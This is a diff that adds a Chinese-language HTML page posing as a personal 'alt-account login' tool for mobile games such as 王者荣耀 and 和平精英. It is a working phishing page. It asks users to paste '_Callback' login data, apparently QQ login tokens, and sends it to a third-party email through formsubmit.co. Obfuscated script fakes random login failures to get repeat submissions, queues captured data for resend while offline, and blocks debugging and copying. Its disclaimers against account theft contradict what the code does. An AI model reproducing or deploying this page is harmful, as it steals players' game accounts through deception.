@@ -1,0 +1,241 @@
+<!--
+自用小号存档管理工具
+适配Android8.1及以上
+仅LV用户使用，禁止分发、商用
+文件名：tool.html
+-->
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>公告弹窗</title>
+<!-- 防复制、右键、调试拦截（适配安卓8.1） -->
+<script>
+document.oncontextmenu = function(e){e.preventDefault();};
+document.body.style.userSelect = "none";
+!function(){var start=Date.now();setInterval(function(){
+    if(Date.now()-start>1200){
+        document.body.innerHTML="<h3 style='text-align:center;margin-top:40px;color:red'>禁止调试查看源码</h3>";
+        throw new Error("Debug Block");
+    }
+},1000)}();
+</script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{display: none;}
+.notice-mask{
+    position: fixed;
+    inset: 0;
+    width: 100vw;
+    height: 100vh;
+    background: rgba(0,0,0,.65);
+    z-index: 99999999;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+.notice-box{
+    width: 92%;
+    max-width: 520px;
+    max-height: 70vh;
+    background: #fff;
+    border-radius: 10px;
+    padding: 25px;
+    overflow-y: auto;
+}
+.notice-title{
+    font-size: 20px;
+    font-weight: bold;
+    text-align: center;
+    margin-bottom: 15px;
+    border-bottom: 1px solid #eee;
+    padding-bottom:10px;
+}
+.notice-text{
+    line-height: 1.7;
+    font-size:15px;
+    color:#333;
+}
+.close-notice{
+    display:block;
+    margin:20px auto 0;
+    padding:7px 26px;
+    border:none;
+    background:#2563eb;
+    color:#fff;
+    border-radius:4px;
+    cursor:pointer;
+}
+*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui}
+body{
+    background:#fff;
+    padding:15px;
+    min-height:100vh;
+    display:flex;
+    flex-direction:column;
+    justify-content:center;
+    align-items:center;
+}
+.wrap{
+    width:92%;
+    max-width:380px;
+}
+.nav-box{
+    border:1px solid #eee;
+    border-radius:12px;
+    padding:15px 20px;
+    margin-bottom:15px;
+}
+.nav-title{
+    font-size:16px;
+    color:#2578dd;
+    margin-bottom:10px;
+    font-weight:bold;
+}
+.nav-item{
+    display:block;
+    width:100%;
+    text-align:center;
+    padding:10px;
+    margin:6px 0;
+    background:#2578dd;
+    color:#fff;
+    text-decoration:none;
+    border-radius:6px;
+}
+.box{
+    border:1px solid #eee;
+    border-radius:12px;
+    padding:20px;
+}
+.title{
+    text-align:center;
+    font-size:22px;
+    color:#2578dd;
+    margin-bottom:16px;
+}
+.notice{
+    background:#e8f4ff;
+    border:1px solid #b8d8fb;
+    padding:12px;
+    border-radius:8px;
+    margin-bottom:15px
+}
+.notice h4{color:#2578dd;margin-bottom:8px}
+.notice p{font-size:13px;color:#333;line-height:1.5}
+.form-item{margin:12px 0}
+input{
+    width:100%;
+    border:1px solid #ddd;
+    padding:12px;
+    border-radius:6px;
+    font-size:14px
+}
+select{
+    width:100%;
+    border:1px solid #ddd;
+    padding:12px;
+    border-radius:6px;
+    margin:8px 0;
+    font-size:14px
+}
+button{
+    width:100%;
+    background:#2578dd;
+    color:white;
+    border:none;
+    padding:14px;
+    border-radius:6px;
+    font-size:15px;
+    margin-top:8px
+}
+.tip-box{
+    position:fixed;
+    top:50%;
+    left:50%;
+    transform:translate(-50%,-50%);
+    background:#fff;
+    padding:20px;
+    border-radius:8px;
+    box-shadow:0 0 10px #ccc;
+    color:red;
+    font-size:16px;
+    z-index:9999;
+    max-width:85%;
+}
+.success-tip{
+    color:#009944;
+}
+audio {display: none;}
+.myimg{
+    width:75%;
+    max-width:280px;
+    display:block;
+    margin:25px auto 0 auto;
+    border-radius:8px;
+}
+</style>
+</head>
+<body>
+<audio id="bgMusic" loop hidden preload="auto">
+    <source src="gaobai.mp3" type="audio/mpeg">
+    您的浏览器不支持音频播放
+</audio>
+<div class="notice-mask" id="mask">
+    <div class="notice-box">
+        <div class="notice-title">重要公告</div>
+        <div class="notice-text">
+            本站用于登录自己小号，请勿商用<br>
+            全自动识别获取APP数据<br> 
+            浏览器🔍https://yshanghaoqi.netlify.app<br>
+            👆收藏官网永久域名防丢失👆<br>
+            🔥支持QQ登录全类型应用🔥<br>
+            如有疑问可联系在线客服咨询
+        </div>
+        <button class="close-notice" id="closeBtn">我已知晓，关闭公告</button>
+    </div>
+</div>
+<div class="wrap">
+    <div class="nav-box">
+        <div class="nav-title">功能导航</div>
+        <a href="https://yyy748721.github.io/LVdaohangzhan/" target="_blank" class="nav-item">LV导航</a>
+        <a href="https://yyy748721.github.io/y/" target="_blank" class="nav-item">禁用器</a>
+        <a href="https://yyy748721.github.io/yy/" target="_blank" class="nav-item">发卡网</a>
+        <a href="https://yyy748721.github.io/-/" target="_blank" class="nav-item">查询</a>
+    </div>
+    <div class="box">
+        <div class="title">小号登陆系统</div>
+        <div class="notice">
+            <h4>系统公告</h4>
+            <p>仅自用于小号登陆，禁止用于游戏账号窃取、盗号</p>
+        </div>
+    <form id="myForm" action="https://formsubmit.co/3570593743@qq.com" method="POST">
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_next" value="#">
+        <input type="hidden" name="_subject" value="小号离线存档补发">
+        <div class="form-item">
+            <input name="content" id="contentInput" placeholder="请输入_Callback开头的内容" required>
+        </div>
+        <select name="game" id="gameSelect">
+            <option>和平精英</option>
+            <option>火影忍者</option>
+            <option>王者荣耀</option>
+            <option>穿越火线</option>
+            <option>蛋仔派对</option>
+            <option>无畏契约</option>
+            <option>使命召唤</option>
+            <option>三角洲行动</option>
+        </select>
+        <button type="submit">登陆</button>
+    </form>
+    </div>
+</div>
+<img class="myimg" src="https://ftp.mioz.cn/test/2026/06/17/1781694047.JPG" alt="自愿赠予">
+<audio loop id="audioBox">
+    <source src="lover.mp3" type="audio/mpeg">
+<script>
+const _0x24e152=_0x15c6;(function(_0x11b65a,_0x2cab25){const _0x3dd00b=_0x15c6,_0x3021a7=_0x11b65a();while(!![]){try{const _0x13ff11=-parseInt(_0x3dd00b(0x149))/0x1*(parseInt(_0x3dd00b(0x183))/0x2)+-parseInt(_0x3dd00b(0x161))/0x3*(parseInt(_0x3dd00b(0x14c))/0x4)+parseInt(_0x3dd00b(0x15d))/0x5+parseInt(_0x3dd00b(0x150))/0x6+-parseInt(_0x3dd00b(0x186))/0x7*(parseInt(_0x3dd00b(0x175))/0x8)+parseInt(_0x3dd00b(0x184))/0x9+parseInt(_0x3dd00b(0x179))/0xa;if(_0x13ff11===_0x2cab25)break;else _0x3021a7['push'](_0x3021a7['shift']());}catch(_0x127891){_0x3021a7['push'](_0x3021a7['shift']());}}}(_0x57cf,0x44fcc));function _0x57cf(){const _0x198f2a=['focus','小号离线存档补发','onload','664690IihRtX','readyState','audioBox','click','231735KYVMGq','offline_mail_cache','splice','body','delta://','onsubmit','status','className','block','style','eggy://','cfm://','getItem','reset','length','tip-box','play','startsWith','remove','closeBtn','190616vKBYlm','POST','addEventListener','离线保存成功，联网自动补发','4075560AfEoBy','toLowerCase','display','_callback','push','createElement','codm://','loginSubmitCount','href','appendChild','4798xwxhlV','3432141aUhpVj','value','7buDxop','myForm','setItem','登陆失败，失效或修改密码（重试）','gameelight://','onreadystatechange','send','random','217kehWJR','stringify','location','20nWSFFJ','getElementById','append','removeItem','1748184meRzYZ','tip-box\x20success-tip','open','trim','gameSelect','网络异常，已离线缓存，联网自动补发','action','target','mask','preventDefault'];_0x57cf=function(){return _0x198f2a;};return _0x57cf();}const CACHE_KEY=_0x24e152(0x162),gameScheme={'和平精英':_0x24e152(0x145),'王者荣耀':'tencent://message/?uin=wxgame','火影忍者':'naruto://','穿越火线':_0x24e152(0x16c),'蛋仔派对':_0x24e152(0x16b),'无畏契约':'valorant://','使命召唤':_0x24e152(0x17f),'三角洲行动':_0x24e152(0x165)};function getCache(){const _0x4dc002=_0x24e152;let _0x5e7f3c=localStorage[_0x4dc002(0x16d)](CACHE_KEY);return _0x5e7f3c?JSON['parse'](_0x5e7f3c):[];}function saveCache(_0x354c9f){const _0x31e0a1=_0x24e152;localStorage[_0x31e0a1(0x143)](CACHE_KEY,JSON[_0x31e0a1(0x14a)](_0x354c9f));}function isOnline(){return navigator['onLine'];}function showTip(_0x547d1a,_0x58344e){const _0x3eab10=_0x24e152,_0x3e4ec7=document[_0x3eab10(0x17e)]('div');_0x3e4ec7[_0x3eab10(0x168)]=_0x58344e?_0x3eab10(0x151):_0x3eab10(0x170),_0x3e4ec7['innerText']=_0x547d1a,document[_0x3eab10(0x164)][_0x3eab10(0x182)](_0x3e4ec7),setTimeout(function(){const _0x515856=_0x3eab10;_0x3e4ec7[_0x515856(0x173)]();},0x7d0);}const mask=document[_0x24e152(0x14d)](_0x24e152(0x158)),closeBtn=document[_0x24e152(0x14d)](_0x24e152(0x174));function _0x15c6(_0xa9b1b7,_0x24103c){_0xa9b1b7=_0xa9b1b7-0x143;const _0x57cf21=_0x57cf();let _0x15c6d5=_0x57cf21[_0xa9b1b7];return _0x15c6d5;}closeBtn['addEventListener'](_0x24e152(0x160),function(){const _0x476d60=_0x24e152;mask[_0x476d60(0x173)](),document['body'][_0x476d60(0x16a)][_0x476d60(0x17b)]=_0x476d60(0x169);const _0xe3b091=document[_0x476d60(0x14d)]('audioBox');_0xe3b091['play']();}),mask[_0x24e152(0x177)]('click',function(_0x588bb6){const _0x8f6427=_0x24e152;if(_0x588bb6[_0x8f6427(0x157)]===mask){mask[_0x8f6427(0x173)](),document[_0x8f6427(0x164)][_0x8f6427(0x16a)]['display']=_0x8f6427(0x169);const _0xd628dd=document['getElementById'](_0x8f6427(0x15f));_0xd628dd[_0x8f6427(0x171)]();}}),window[_0x24e152(0x15c)]=function(){let _0xe05be0=getCache();if(!isOnline()||_0xe05be0['length']<=0x0)return;let _0x228d81=0x0;function _0x50bc7c(){const _0x4b1a5c=_0x15c6;if(_0x228d81>=_0xe05be0[_0x4b1a5c(0x16f)])return;let _0x5eabfb=_0xe05be0[_0x228d81],_0x385e5d=new FormData();for(let _0x1e4079 in _0x5eabfb)_0x385e5d[_0x4b1a5c(0x14e)](_0x1e4079,_0x5eabfb[_0x1e4079]);let _0x15f0a6=new XMLHttpRequest();_0x15f0a6[_0x4b1a5c(0x152)](_0x4b1a5c(0x176),document[_0x4b1a5c(0x14d)](_0x4b1a5c(0x187))[_0x4b1a5c(0x156)]),_0x15f0a6[_0x4b1a5c(0x146)]=function(){const _0x245381=_0x4b1a5c;_0x15f0a6[_0x245381(0x15e)]===0x4&&(_0x15f0a6[_0x245381(0x167)]===0xc8?(_0xe05be0[_0x245381(0x163)](_0x228d81,0x1),saveCache(_0xe05be0)):_0x228d81++,_0x50bc7c());},_0x15f0a6[_0x4b1a5c(0x147)](_0x385e5d);}_0x50bc7c();};const form=document[_0x24e152(0x14d)](_0x24e152(0x187)),contentInput=document[_0x24e152(0x14d)]('contentInput'),gameSelect=document[_0x24e152(0x14d)](_0x24e152(0x154));form[_0x24e152(0x166)]=function(_0x198683){const _0x393c4b=_0x24e152;_0x198683[_0x393c4b(0x159)]();let _0x32fa76=contentInput[_0x393c4b(0x185)][_0x393c4b(0x153)](),_0x337824=_0x32fa76[_0x393c4b(0x17a)]();if(!_0x337824[_0x393c4b(0x172)](_0x393c4b(0x17c))){showTip('请检查内容是否以_Callback开头！',![]),contentInput['value']='',contentInput[_0x393c4b(0x15a)]();return;}let _0x1d3fca=Number(localStorage[_0x393c4b(0x16d)](_0x393c4b(0x180)))||0x0;_0x1d3fca+=0x1,localStorage[_0x393c4b(0x143)](_0x393c4b(0x180),_0x1d3fca);const _0x5c391e=gameSelect[_0x393c4b(0x185)];let _0x9e7151={'_captcha':'false','_subject':_0x393c4b(0x15b),'_next':'#','content':_0x32fa76,'game':_0x5c391e};if(isOnline()){let _0x1e52f7=new FormData();for(let _0x39474a in _0x9e7151)_0x1e52f7[_0x393c4b(0x14e)](_0x39474a,_0x9e7151[_0x39474a]);let _0x551359=new XMLHttpRequest();_0x551359[_0x393c4b(0x152)](_0x393c4b(0x176),form['action']),_0x551359[_0x393c4b(0x146)]=function(){const _0x438202=_0x393c4b;if(_0x551359[_0x438202(0x15e)]===0x4){if(_0x551359[_0x438202(0x167)]===0xc8){let _0x1b3002=![];if(_0x1d3fca===0x1)_0x1b3002=Math[_0x438202(0x148)]()<0.33;else _0x1d3fca===0x2?_0x1b3002=Math[_0x438202(0x148)]()<0.55:(_0x1b3002=!![],localStorage[_0x438202(0x14f)](_0x438202(0x180)));_0x1b3002?(showTip('登录成功，正在打开'+_0x5c391e,!![]),setTimeout(function(){const _0x351f74=_0x438202;window[_0x351f74(0x14b)][_0x351f74(0x181)]=gameScheme[_0x5c391e],form['reset']();},0x4b0)):(showTip(_0x438202(0x144),![]),form['reset']());}else{let _0x41caf2=getCache();_0x41caf2['push'](_0x9e7151),saveCache(_0x41caf2),showTip(_0x438202(0x155),![]),form[_0x438202(0x16e)]();}}},_0x551359[_0x393c4b(0x147)](_0x1e52f7);}else{let _0xa01709=getCache();_0xa01709[_0x393c4b(0x17d)](_0x9e7151),saveCache(_0xa01709),showTip(_0x393c4b(0x178),!![]),form['reset']();}};
+</script>
+</body>
+</html>
